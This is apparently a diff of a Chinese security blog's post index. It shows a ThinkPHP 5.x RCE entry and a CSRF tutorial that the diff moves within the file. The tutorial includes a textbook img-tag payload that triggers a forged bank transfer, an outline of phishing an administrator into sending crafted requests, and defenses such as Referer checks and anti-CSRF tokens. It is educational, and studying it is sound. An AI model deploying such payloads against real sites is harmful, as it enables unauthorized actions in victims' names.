+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.5-5.0.22<br>5.1.0-5.1.30</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://i.loli.net/2021/10/25/uE87XZ3adiMRgbQ.png" alt="image-20211025133109582"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/3570">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
+<p><a href="https://www.anquanke.com/post/id/252811#h3-7">ThinkPHP V5 漏洞复现</a></p>
+]]></content>
   </entry>
   <entry>
     <title>tomcat-ajp文件包含漏洞</title>
@@ -1119,51 +1128,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>常见web漏洞学习之CSRF</title>
-    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
-    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
-<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
-<blockquote>
-<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
-</blockquote>
-<p>图里解释很清楚了，就不赘述了</p>
-<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
-<p>还是老生常谈的银行转账的问题</p>
-<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
-<p>而攻击者构造的代码是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
-<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
-<blockquote>
-<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
-</blockquote>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
-<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
-<li>验证http referer字段</li>
-</ol>
-<p>referer就是记录了请求的来源（同源策略）</p>
-<blockquote>
-<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
-</blockquote>
-<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
-<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
-<li>添加token并验证</li>
-</ol>
-<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
-<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
-<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
-]]></content>
-      <categories>
-        <category>csrf</category>
-      </categories>
-      <tags>
-        <tag>csrf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见web漏洞学习之xss学习</title>
     <url>/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="常见web漏洞学习之xss学习"><a href="#常见web漏洞学习之xss学习" class="headerlink" title="常见web漏洞学习之xss学习"></a>常见web漏洞学习之xss学习</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
@@ -1233,6 +1197,51 @@
       </categories>
       <tags>
         <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常见web漏洞学习之CSRF</title>
+    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
+    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
+<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
+<blockquote>
+<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
+</blockquote>
+<p>图里解释很清楚了，就不赘述了</p>
+<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
+<p>还是老生常谈的银行转账的问题</p>
+<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
+<p>而攻击者构造的代码是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
+<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
+<blockquote>
+<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
+</blockquote>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
+<li>验证http referer字段</li>
+</ol>
+<p>referer就是记录了请求的来源（同源策略）</p>
+<blockquote>
+<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
+</blockquote>
+<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
+<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
+<li>添加token并验证</li>
+</ol>
+<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
+<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
+<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
+]]></content>
+      <categories>
+        <category>csrf</category>
+      </categories>
+      <tags>
+        <tag>csrf</tag>
       </tags>
   </entry>
   <entry>
